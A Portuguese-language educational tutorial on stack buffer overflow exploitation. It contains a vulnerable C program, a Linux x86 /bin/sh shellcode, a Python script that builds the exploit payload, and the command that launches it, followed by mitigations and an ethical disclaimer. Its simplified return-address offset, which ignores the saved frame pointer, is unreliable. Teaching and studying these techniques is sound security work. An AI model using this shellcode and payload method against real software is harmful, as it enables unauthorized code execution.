```markdown
# Exemplo de Exploração de Vulnerabilidade com Shellcode

A exploração de vulnerabilidades de corrupção de memória, especialmente em linguagens como C e C++, é um dos temas centrais na segurança de software. Entre as técnicas mais conhecidas está a injeção e execução de **shellcode** — pequenos trechos de código malicioso inseridos na memória do processo vulnerável, geralmente com o objetivo de obter controle do sistema.

Neste tópico, apresentaremos um exemplo prático de exploração de uma vulnerabilidade de **buffer overflow** em C, demonstrando como um atacante pode injetar e executar um shellcode.

---

## 1. O que é Shellcode?

Shellcode é um código binário, geralmente escrito em linguagem de máquina, projetado para ser injetado e executado em um processo alvo. O nome deriva do objetivo original: abrir uma shell (terminal) para o atacante, mas pode realizar qualquer ação, como baixar arquivos, criar usuários ou escalar privilégios.

---

## 2. Exemplo de Código Vulnerável em C

Considere o seguinte programa C vulnerável a buffer overflow:

```c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input); // Não há verificação de tamanho!
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Uso: %s <input>\n", argv[0]);
        return 1;
    }
    vulnerable_function(argv[1]);
    printf("Execução finalizada.\n");
    return 0;
}
```

**Problema:** A função `strcpy` copia o conteúdo de `input` para `buffer` sem verificar o tamanho, permitindo que um input maior que 64 bytes sobrescreva a memória adjacente, incluindo o endereço de retorno da função.

---

## 3. Preparando o Shellcode

Um shellcode clássico para sistemas Linux x86 que executa `/bin/sh` pode ser:

```assembly
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```

Este shellcode, quando executado, abre um shell interativo.

---

## 4. Construindo o Exploit

O objetivo é sobrescrever o endereço de retorno da função `vulnerable_function` para apontar para o início do buffer, onde o shellcode foi injetado.

### Passos:

1. **Preencher o buffer:** Envie 64 bytes (tamanho do buffer) com NOPs (`\x90`), conhecidos como *NOP sled*, para aumentar a chance de execução do shellcode.
2. **Inserir o shellcode:** Logo após o NOP sled, insira o shellcode.
3. **Sobrescrever o endereço de retorno:** Após os 64 bytes do buffer, sobrescreva os próximos 4 bytes (em sistemas 32 bits) com o endereço do início do buffer.

### Exemplo de Payload em Python:

```python
import sys

# Endereço do buffer (exemplo, pode variar conforme o sistema e compilador)
buffer_address = 0xbffffc30

# Shellcode para /bin/sh
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    b"\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
)

# NOP sled
nop_sled = b"\x90" * (64 - len(shellcode))

# Endereço de retorno sobrescrito (little endian)
ret = buffer_address.to_bytes(4, byteorder='little')

payload = nop_sled + shellcode + ret

# Salvar em arquivo ou passar como argumento
with open("payload", "wb") as f:
    f.write(payload)
```

---

## 5. Execução do Exploit

No terminal, execute o programa vulnerável passando o payload como argumento:

```bash
./vulneravel "$(cat payload)"
```

Se o endereço estiver correto e as proteções do sistema permitirem, o shellcode será executado, abrindo uma shell com os privilégios do processo.

---

## 6. Considerações de Segurança

- **Proteções modernas:** Sistemas atuais implementam proteções como ASLR (Address Space Layout Randomization), DEP/NX (Data Execution Prevention), Stack Canaries, entre outras, que dificultam ou impedem a execução desse tipo de exploit.
- **Importância da validação:** Sempre valide o tamanho dos dados de entrada e utilize funções seguras como `strncpy` ou `snprintf`.
- **Ambiente controlado:** Nunca execute exploits em sistemas de produção ou sem autorização.

---

## 7. Conclusão

Este exemplo ilustra como uma simples falha de programação pode ser explorada para executar código arbitrário, destacando a importância de práticas seguras de desenvolvimento. O entendimento dessas técnicas é fundamental tanto para profissionais de segurança ofensiva quanto defensiva, permitindo identificar, mitigar e prevenir vulnerabilidades críticas em softwares.

---

> **Atenção:** Este conteúdo é apenas para fins educacionais e deve ser utilizado de forma ética e responsável.
```
